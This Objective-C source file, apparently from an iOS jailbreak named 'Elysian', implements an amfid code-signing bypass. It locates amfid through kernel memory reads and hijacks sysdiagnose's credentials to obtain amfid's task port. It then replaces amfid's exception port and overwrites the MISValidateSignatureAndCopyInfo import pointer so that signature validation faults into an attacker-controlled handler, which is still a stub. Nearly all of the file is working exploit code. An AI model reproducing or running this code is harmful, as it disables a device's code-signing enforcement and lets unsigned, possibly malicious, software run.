//
//  amfidestroyer.m
//  Elysian
//
//  Created by chris  on 5/20/20.
//  Copyright © 2020 chr1s_0x1. All rights reserved.
//

#import <Foundation/Foundation.h>
#include <spawn.h>
#include <pthread.h>
#include <mach-o/loader.h>
#include <mach/mach.h>

#import "jelbrekLib.h"
#import "amfidestroyer.h"
#import "kernel_memory.h"
#import "jbtools.h"
#import "utils.h"
#import "amfiutils.h"

pthread_t exceptionThread;
static mach_port_name_t AMFID_ExceptionPort = MACH_PORT_NULL;
uint64_t origAMFID_MISVSACI = 0;
uint64_t amfid_base;

// will handle the amfi exception messages
void* AMFIDExceptionHandler(void* arg) {
    LOG("[handler] Recieving amfid message..");
    
    return NULL;
}

int AmfidSetException(uint64_t amfidport, void *(exceptionHandler)(void*)) {
    if(!MACH_PORT_VALID(amfidport)) {
        LOG("[exception] ERR: amfid port given is invalid");
        return 1;
    }
    // add an insert right
    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &AMFID_ExceptionPort);
    mach_port_insert_right(mach_task_self(), AMFID_ExceptionPort, AMFID_ExceptionPort, MACH_MSG_TYPE_MAKE_SEND);
    // did we add an insert right?
    if(!MACH_PORT_VALID(AMFID_ExceptionPort)) {
        LOG("[exception] ERR: Couldn't insert a port right");
        mach_port_destroy(mach_task_self_, AMFID_ExceptionPort);
        return 1;
    }
    LOG("[exception] Inserted a port right");
    // probably gonna need uid = 0 here
    setuid(0);
    if(getuid() != 0) {
        LOG("[exception] OOF");
    }
    // replace exception port with ours
    kern_return_t ret = task_set_exception_ports(amfid_task_port, EXC_MASK_ALL, AMFID_ExceptionPort, EXCEPTION_DEFAULT | MACH_EXCEPTION_CODES, ARM_THREAD_STATE64);
    if(ret != KERN_SUCCESS) {
        LOG("[exception] ERR: Couldn't replace amfid exception port!");
        mach_port_destroy(mach_task_self_, AMFID_ExceptionPort);
        return 1;
    }
    LOG("[exception] Replaced amfid's exception port with ours");
    // setup a new thread where to handle the exceptions
    pthread_create(&exceptionThread, NULL, exceptionHandler, NULL);
    LOG("[exception] We're done here, exiting..");
    return 0;
}

int find_amfid() {
    LOG("[find amfid] Looking for amfid..");
    uint64_t proc = rk64(Find_allproc());
    UInt32 amfidpid = 0;
    while(proc != 0) {
        char amfidname[32];
        var pid = rk32(proc + (UInt64)(0x68));
        uint64_t procname = proc + 0x258;
        kread(procname, amfidname, 32);
        if(strncmp(amfidname, "amfid", 32) == 0) {
            LOG("[find amfid] Found amfid! Exiting..");
            amfidpid = pid;
            return amfidpid;
        }
        proc = rk64(proc);
    }
    LOG("[find amfid] ERR: Couldn't find amfid");
    return 1;
}

pid_t hijacksysdiagnose() {
    LOG("[sys] Hijacking sysdiagnose..");
    // find sysdiagnose's pid
    pid_t syspid;
    char const *args[] = {"sysdiagnose", NULL};
    posix_spawn(&syspid, "/usr/bin/sysdiagnose", NULL, NULL, args, NULL);
    // get the proc from syspid
    uint64_t sysproc = proc_of_pid(syspid);
    if(!ADDRISVALID(sysproc)) {
        LOG("[sys] ERR: sysdiagnose proc is invalid");
        return 1;
    }
    LOG("[sys] Got sysdiagnose proc: 0x%llx", sysproc);
    
    // grab sysdiagnose's creds and entitlements
    int ents = CredsTool(sysproc, 0, YES, NO);
    if(ents != 0) {
        return 1;
    }
    LOG("[sys] Got sysdiagnose creds, returning..");
    return syspid;
}

int amfidestroyer() {
    LOG("[amfid] Let's do this..");
    mach_port_t amfid_task = MACH_PORT_NULL;
    // Get amfid's pid
    pid_t amfipid = find_amfid();
    if(amfipid == 1) return 1; // find_amfid() returns 1 if it fails
    LOG("[amfid] Got amfid pid: %d", amfipid);
    
    // hijack sysdiagnose so we can get the amfi task port
    pid_t syspid = hijacksysdiagnose();
    if(syspid == 1) { // hijacksysdiagnose returns 1 if it fails
        LOG("[amfid] ERR: Couldn't get sysdiagnose creds");
        CredsTool(0, 1, NO, NO);
        return 1;
    }
    
    // Grab amfid's task port
    task_for_pid(mach_task_self_, amfipid, &amfid_task);
    if(!MACH_PORT_VALID(amfid_task)) {
        LOG("ERR: Failed to get amfid task port");
        mach_port_destroy(mach_task_self_, amfid_task);
        return 1;
    }
    LOG("[amfid] Got amfid task port");
    
    // for AmfidWrite, AmfidRead etc.
    init_amfid_mem(amfid_task);
    
    // get the load address
    uint64_t amfi_load = binary_load_address(amfid_task);
    if(amfi_load == 0) {
        LOG("[amfid] ERR: Couldn't find amfid load address");
        return 1;
    }
    LOG("[amfid] Got amfid load address");
    
    /*-------- now for patching amfi --------*/
    
    LOG("[amfid patch] ?: Applying amfid patches..");
    
    // 1. Set exception handler
    int set = AmfidSetException(amfid_task, AMFIDExceptionHandler);
    if(set != 0) {
        LOG("[amfid] ERR: Couldn't set exception handler!");
        kill(syspid, SIGKILL);
        CredsTool(0, 1, NO, NO);
        return 1;
    }
    LOG("[amfid patch] 1/2 - Set exception handler");
    
    // check if we can read MISValidateSignatureAndCopyInfo
    mach_vm_size_t sz;
    kern_return_t kr = mach_vm_read_overwrite(amfid_task, amfi_load+amfid_MISValidateSignatureAndCopyInfo_import_offset, 8, (mach_vm_address_t)&origAMFID_MISVSACI, &sz);
    if(kr != KERN_SUCCESS) {
        LOG("[amfid] ERR: Couldn't read MISVSACI");
        kill(syspid, SIGKILL);
        CredsTool(0, 1, NO, NO);
        return 1;
    }

    // 2. patch up amfid to crash
    AmfidWrite_64bits(amfi_load + amfid_MISValidateSignatureAndCopyInfo_import_offset, 0x4141414141414141);
    LOG("[amfid patch] 2/2 - MISVSACI is now 0x41");
    
    /*---------- End of patch ----------*/
    
    LOG("[amfid] Mission complete, cleaning up..");
    // clean up
    kill(syspid, SIGKILL);
    CredsTool(0, 1, NO, NO);
    return 0;
}
